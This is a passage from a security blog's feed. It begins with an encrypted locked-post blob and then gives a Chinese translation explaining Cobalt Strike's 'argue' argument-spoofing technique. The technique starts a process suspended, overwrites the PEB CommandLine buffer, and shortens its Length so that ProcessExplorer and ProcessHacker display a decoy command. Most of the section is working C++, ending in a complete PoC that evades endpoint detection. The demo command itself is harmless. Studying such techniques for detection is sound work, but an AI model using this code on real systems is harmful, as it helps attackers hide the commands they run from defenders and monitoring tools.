ee4026c57eb75acfac6bad77552d3abaffcf2c26a76f759be2e7e4aba0c447afcdeb5fbf595bea1c3ff7da5bd90e85aa173cb23e32e5f161240a53f3b688f6979e4a45b53962255ad75467b26a7e49ea978634d613222a1656522c8c480d048fdf0710ed0b71de9b0ecfb3e314350aa23442e05c159833a203ad3cfe6671521fe560bfca0d75956d6a8aa650c005f8a0e888e9447234c2ee7b97d79422f6981a790f777f31937be41de70d13a536fb23064239fc3364d7ea3de162e650b70effbecef96423ac0fcb6c5936d2c46470428841117369b65c10da8148b7614c52a9f4f11c36bc87340309bda239f82d3b742b6ad256e4252ffc3595d73eac71208c08394924c02c7e48ed75f0770314bd70b3b4623e7d06eef1007c503c88718aadb6bb0d1d87c3dfda0e8283e74ab2f58b252932e0d0dbe3b9fd786bb98a0eb6a884588ed1ed6e6ce13ebd0a53c3b433c4b99ed498beeacaf30e2594a26cdacf8aa8633cefea9533b34f171bd8f725fa104b9725e1ec0eaaee4ef7b978d5b45902359aeabfd72ca3a52b7b17dcd91dfc1183941d22fec2a16518a3e04cc45511f35e33a32c9251fb032b7f5482dfa1eaa08c7daabd41267a520b7328677af52ac8c0fef1de34790e6863ec058a8f66fd0ae920d4a779b96a529979d2929a2fbc8212b16b8e27050549df03efb0c1c7a49dc735972d6366379105ff1c203393f6b5a71dde8b7d0557ae6e70d70981e06b003575c4c8e2a21f7eab01e30c03384e7778751b55557d800e3c7eebe55c55fdf1cbc52d9d0e6faf70cd2e31e2aa78feee0418a595bfe0f09041f02c66657c189c650897f75ae6fe4cae27b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      应厂商需求加🔐，待合适时间重新开放，请勿二次外泄
    
    </summary>
    
    
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike Argue 原理 - 翻译文</title>
    <link href="https://blog.sari3l.com/posts/c5e878c3/"/>
    <id>https://blog.sari3l.com/posts/c5e878c3/</id>
    <published>2020-08-04T09:26:01.000Z</published>
    <updated>2020-08-04T09:46:29.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/c5e878c3/15965212817543.jpg" alt></p><p>看 youtube 视频介绍，此攻击原本是为了对抗 EDR 检测或延迟 AV 查杀的手段</p><p>原理很简单，通过设置CREATE_SUSPENDED挂起进程启动，再通过PEB修改ProcessParameters中实际将要执行的命令字符串，最后ResumeThread恢复进程 → 暗度陈仓</p><p>在实现时，延伸出来两个小问题(技巧)</p><ol><li>如何获取 PEB 并更新</li><li>绕过 PEB 副本检测</li></ol><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h2><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>  LPCSTR                lpApplicationName<span class="token punctuation">,</span>  LPSTR                 lpCommandLine<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpProcessAttributes<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpThreadAttributes<span class="token punctuation">,</span>  BOOL                  bInheritHandles<span class="token punctuation">,</span>  DWORD                 dwCreationFlags<span class="token punctuation">,</span>  LPVOID                lpEnvironment<span class="token punctuation">,</span>  LPCSTR                lpCurrentDirectory<span class="token punctuation">,</span>  LPSTARTUPINFOA        lpStartupInfo<span class="token punctuation">,</span>  LPPROCESS_INFORMATION lpProcessInformation<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener">CreateProcessA</a>函数中我们关注到lpCommandLine和dwCreationFlags</p><ul><li>lpCommandLine：要执行的命令行 -&gt; 明面上要执行的命令行</li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" target="_blank" rel="noopener">dwCreationFlags</a>：流程创建标志</li></ul><p>在<code>流程创建标志</code>中多个标记使用<code>|(或)运算</code>叠加，有以下几个常数值需要关注</p><table><thead><tr><th>常数/值</th><th>描述</th></tr></thead><tbody><tr><td>CREATE_NEW_CONSOLE<br>0x00000010</td><td>新进程具有一个新的控制台，而不是继承其父级的控制台（默认）。有关更多信息，请参见创建控制台。<br>该标志不能与<strong>DETACHED_PROCESS</strong>一起使用。</td></tr><tr><td>CREATE_NO_WINDOW<br>0x08000000</td><td>该过程是一个没有控制台窗口即可运行的控制台应用程序。因此，未设置应用程序的控制台句柄。<br>如果该应用程序不是控制台应用程序，或者与<strong>CREATE_NEW_CONSOLE</strong>或<strong>DETACHED_PROCESS</strong>一起使用，则将忽略此标志。</td></tr><tr><td>CREATE_SUSPENDED<br>0x00000004</td><td>新进程的主线程在挂起状态下创建，并且直到调用<strong>ResumeThread</strong>函数才运行。</td></tr></tbody></table><p>以下试图创建一个进程并挂起，我们接下来将修改此进程</p><pre class=" language-cpp"><code class="language-cpp">STARTUPINFOA si<span class="token punctuation">;</span>PROCESS_INFORMATION pi<span class="token punctuation">;</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"cmd.exe"</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    FALSE<span class="token punctuation">,</span>    CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>    <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h2><p>首先看在 PEB 结构，我们主要关注 ProcessParameters</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _PEB <span class="token punctuation">{</span>  BYTE                          Reserved1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          BeingDebugged<span class="token punctuation">;</span>  BYTE                          Reserved2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPEB_LDR_DATA                 Ldr<span class="token punctuation">;</span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class="token punctuation">;</span>  PVOID                         Reserved4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         AtlThunkSListPtr<span class="token punctuation">;</span>  PVOID                         Reserved5<span class="token punctuation">;</span>  ULONG                         Reserved6<span class="token punctuation">;</span>  PVOID                         Reserved7<span class="token punctuation">;</span>  ULONG                         Reserved8<span class="token punctuation">;</span>  ULONG                         AtlThunkSListPtr32<span class="token punctuation">;</span>  PVOID                         Reserved9<span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  BYTE                          Reserved10<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class="token punctuation">;</span>  BYTE                          Reserved11<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID                         Reserved12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  ULONG                         SessionId<span class="token punctuation">;</span><span class="token punctuation">}</span> PEB<span class="token punctuation">,</span> <span class="token operator">*</span>PPEB<span class="token punctuation">;</span></code></pre><p>PRTL_USER_PROCESS_PARAMETERS 结构体</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _RTL_USER_PROCESS_PARAMETERS <span class="token punctuation">{</span>  BYTE           Reserved1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  PVOID          Reserved2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  UNICODE_STRING ImagePathName<span class="token punctuation">;</span>  UNICODE_STRING CommandLine<span class="token punctuation">;</span><span class="token punctuation">}</span> RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> <span class="token operator">*</span>PRTL_USER_PROCESS_PARAMETERS<span class="token punctuation">;</span></code></pre><p>UNICODE_STRING 类型结构体</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>在上面通过创建并挂起进程后，接下来我们将通过<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank" rel="noopener">NtQueryInformationProcess</a>来获取 PEB 地址，这个函数未公开所以需要<a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019" target="_blank" rel="noopener">GetProcAddress</a>从 DLL 中检索出函数地址</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span> <span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token punctuation">(</span>  IN HANDLE<span class="token punctuation">,</span>  IN PROCESSINFOCLASS<span class="token punctuation">,</span>  OUT PVOID<span class="token punctuation">,</span>  IN ULONG<span class="token punctuation">,</span>  OUT PULONG<span class="token punctuation">)</span><span class="token punctuation">;</span>NtQueryInformationProcess ntip <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>DWORD retLen<span class="token punctuation">;</span><span class="token function">ntpi</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>    ProcessBasicInformation<span class="token punctuation">,</span>    <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>retLen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过 PEB 标记的地址，使用<code>ReadProcessMemory</code>读取目标进程的 PEB 信息</p><pre class=" language-cpp"><code class="language-cpp">PEB pebLocal<span class="token punctuation">;</span>BOOL success<span class="token punctuation">;</span>success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>进一步获取ProcessParameters结构体信息</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来便是修改ProcessParameters中的CommandLine，其对应类型为UNICODE_STRING</p><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span>success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>    pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>     parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span>     <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>L<span class="token string">"cmd.exe /k dir\0"</span><span class="token punctuation">,</span>     <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="绕过PEB副本检测"><a href="#绕过PEB副本检测" class="headerlink" title="绕过PEB副本检测"></a>绕过PEB副本检测</h2><p>作者提到类似ProcessExplorer工具会检索PEB副本，导致隐藏参数失败，注意到_RTL_USER_PROCESS_PARAMETERS中的CommandLine参数为_UNICODE_STRING类型</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _UNICODE_STRING <span class="token punctuation">{</span>  USHORT Length<span class="token punctuation">;</span>  USHORT MaximumLength<span class="token punctuation">;</span>  PWSTR  Buffer<span class="token punctuation">;</span><span class="token punctuation">}</span> UNICODE_STRING<span class="token punctuation">,</span> <span class="token operator">*</span>PUNICODE_STRING<span class="token punctuation">;</span></code></pre><p>当设置<code>Length &lt; sizeof(Buffer)</code>时，对于ProcessHacker和ProcessExplorer，都会终止显示Length字节后面的字符串，但同时并不影响进程的运行</p><table><thead><tr><th align="center">ProcessExplorer</th><th align="center">ProcessMonitor</th></tr></thead><tbody><tr><td align="center">长度限制</td><td align="center">命令隐藏</td></tr><tr><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/c5e878c3/15965291301083.jpg" alt="-w501"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/c5e878c3/15965291123554.jpg" alt="-w638"></td></tr></tbody></table><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;winternl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_SHOW "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'"</span><span class="token macro property">#<span class="token directive keyword">define</span> CMD_TO_EXEC L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0"</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token punctuation">(</span>    IN HANDLE<span class="token punctuation">,</span>    IN PROCESSINFOCLASS<span class="token punctuation">,</span>    OUT PVOID<span class="token punctuation">,</span>    IN ULONG<span class="token punctuation">,</span>    OUT PULONG    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">readProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> alloc<span class="token punctuation">;</span>    alloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>alloc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> alloc<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> alloc<span class="token punctuation">;</span><span class="token punctuation">}</span>BOOL <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>HANDLE process<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> address<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> data<span class="token punctuation">,</span> DWORD bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SIZE_T bytesWritten<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>process<span class="token punctuation">,</span> address<span class="token punctuation">,</span> data<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesWritten<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> canttrustthis<span class="token punctuation">)</span><span class="token punctuation">{</span>    STARTUPINFOA si<span class="token punctuation">;</span>    PROCESS_INFORMATION pi<span class="token punctuation">;</span>    CONTEXT context<span class="token punctuation">;</span>    BOOL success<span class="token punctuation">;</span>    PROCESS_BASIC_INFORMATION pbi<span class="token punctuation">;</span>    DWORD retLen<span class="token punctuation">;</span>    SIZE_T bytesRead<span class="token punctuation">;</span>    PEB pebLocal<span class="token punctuation">;</span>    RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span> parameters<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Argument Spoofing Example by @_xpn_\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Start process suspended</span>    success <span class="token operator">=</span> <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>CMD_TO_SHOW<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        FALSE<span class="token punctuation">,</span>        CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call CreateProcess\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Retrieve information on PEB location in process</span>    NtQueryInformationProcess2 ntpi <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ntpi</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        ProcessBasicInformation<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>retLen    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read the PEB from the target process</span>    success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call ReadProcessMemory to grab PEB\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Grab the ProcessParameters from PEB</span>    parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">300</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set the actual arguments we are looking to use</span>    WCHAR spoofed<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> CMD_TO_EXEC<span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>spoofed<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>spoofed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline args\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////</span>    <span class="token comment" spellcheck="true">// Update the CommandLine length (Remember, UNICODE length here)</span>    DWORD newUnicodeLen <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pebLocal<span class="token punctuation">.</span>ProcessParameters <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> CommandLine<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>newUnicodeLen<span class="token punctuation">,</span>        <span class="token number">4</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline arg length\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Resume thread execution*/</span>    <span class="token function">ResumeThread</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="思考"><a 